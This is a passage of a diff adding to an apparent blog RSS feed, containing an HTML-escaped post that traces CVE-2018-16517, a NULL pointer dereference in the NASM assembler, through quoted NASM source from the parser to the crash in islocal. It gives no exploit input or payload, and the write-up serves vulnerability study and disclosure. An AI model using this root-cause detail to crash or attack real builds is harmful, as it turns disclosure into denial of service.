+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Assume no label */&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eops&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* must do this, whatever happens */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* must initialize this */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evex_rm&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* Ensure EVEX rounding mode is reset */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evex_brerop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;cm&quot;&gt;/* Reset EVEX broadcasting/ER op position */&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, down to a few lines of code, there is a check before it gets initialized with a valid value which is then skipped because the boolean &lt;code class=&quot;highlighter-rouge&quot;&gt;insn_is_label&lt;/code&gt; is always FALSE.
+Therefore, the &lt;code class=&quot;highlighter-rouge&quot;&gt;result-&amp;gt;label&lt;/code&gt; remains NULL.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn_is_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_INSN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;taken&lt;/span&gt;
+        &lt;span class=&quot;cm&quot;&gt;/* there's a label here */&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_charptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* skip over the optional colon */&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;nasm_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERR_WARNING&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR_WARN_OL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR_PASS1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                  &lt;span class=&quot;s&quot;&gt;&quot;label alone on a line without a colon might be in error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_INSN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I_EQU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;cm&quot;&gt;/*
+             * FIXME: location.segment could be NO_SEG, in which case
+             * it is possible we should be passing 'absolute.segment'. Look into this.
+             * Work out whether that is *really* what we should be doing.
+             * Generally fix things. I think this is right as it is, but
+             * am still not certain.
+             */&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;define_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                         &lt;span class=&quot;n&quot;&gt;in_absolute&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                         &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_line&lt;/code&gt;, there is a check if the opcode is EQU and surprisingly the nasm_error did not handle the error safely (marked as ERR_NONFATAL).
+The &lt;code class=&quot;highlighter-rouge&quot;&gt;output_ins.label&lt;/code&gt; is then being passed into 3 functions before it gets dereferenced (define_label -&amp;gt; find_label -&amp;gt; islocal).&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+            &lt;span class=&quot;cm&quot;&gt;/*  forw_ref */&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I_EQU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;nasm_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERR_NONFATAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                               &lt;span class=&quot;s&quot;&gt;&quot;EQU not preceded by label&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMMEDIATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wrt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NO_SEG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;define_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                 &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                 &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Triggered.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;islocal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tasm_compatible_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'@'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'@'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boom&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Wed, 05 Sep 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/CVE-2018-16517/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2018-16517/</guid>
+        
+        <category>null pointer deref</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+  </channel>
+</rss>
